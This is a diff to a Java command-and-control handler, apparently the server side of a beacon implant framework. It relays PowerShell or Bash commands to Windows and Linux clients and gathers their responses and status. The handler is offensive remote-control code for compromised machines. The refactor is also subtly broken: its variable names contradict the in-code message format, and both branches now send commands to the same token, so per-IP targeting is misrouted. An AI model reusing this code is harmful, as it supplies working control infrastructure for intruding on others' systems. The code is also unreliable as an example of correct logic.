@@ -81,21 +81,24 @@ public class BeaconC2Handler implements Runnable{
                 System.out.println(message);
                 String[] tokensAndCommands = message.split("_");
                 String[] tokens = tokensAndCommands[0].split(" ");
+                String verb = tokens[0];
+                String scope = tokens[1];
+                String target = tokens[2];
                 String commands = tokensAndCommands[1];
                 if(tokens[0].equals("quit")){
                     break;
                 }
-                if(tokens[0].equals("Command")){
+                if(verb.equals("Command")){
                     // If a message is a command, it will be in the format "Command [OS - Windows or Linux] [Scope - All or an IP Address] [Powershell/Bash command to be run]"
-                    if(tokens[2].equals("All")){
-                        beaconServer.distributeCommands(tokens[1], commands);
+                    if(target.equals("All")){
+                        beaconServer.distributeCommands(scope, commands);
                     } else {
-                        beaconServer.distributeCommands(tokens[2], commands);
+                        beaconServer.distributeCommands(scope, commands);
                     }
-                }else if(tokens[0].equals("Request")){
+                }else if(verb.equals("Request")){
                     String responseToRequest = "";
-                    if(tokens[1].equals("ClientData")){
-                        if(tokens[2].equals("Windows")){
+                    if(scope.equals("ClientData")){
+                        if(target.equals("Windows")){
                             if(tokens[3].equals("All")){
                                 HashMap<String, ArrayList<String>> windowsClientResponseList = beaconServer.getMultipleClientResponses("Windows");
                                 for (String IP : windowsClientResponseList.keySet()){
@@ -118,7 +121,7 @@ public class BeaconC2Handler implements Runnable{
                                     }
                                     responseToRequest += "\n";
                             }
-                        }else if(tokens[2].equals("Linux")){
+                        }else if(target.equals("Linux")){
                             if(tokens[3].equals("All")){
                                 HashMap<String, ArrayList<String>> linuxClientResponseList = beaconServer.getMultipleClientResponses("Linux");
                                 for (String IP : linuxClientResponseList.keySet()){
@@ -139,7 +142,7 @@ public class BeaconC2Handler implements Runnable{
                                     responseToRequest += "\n";
                             }
                         }
-                    }else if(tokens[1].equals("ClientStatus")){
+                    }else if(scope.equals("ClientStatus")){
                         responseToRequest = beaconServer.getClientStatus(tokens[2]).toString();
                     }
                     C2Server.send(responseToRequest);
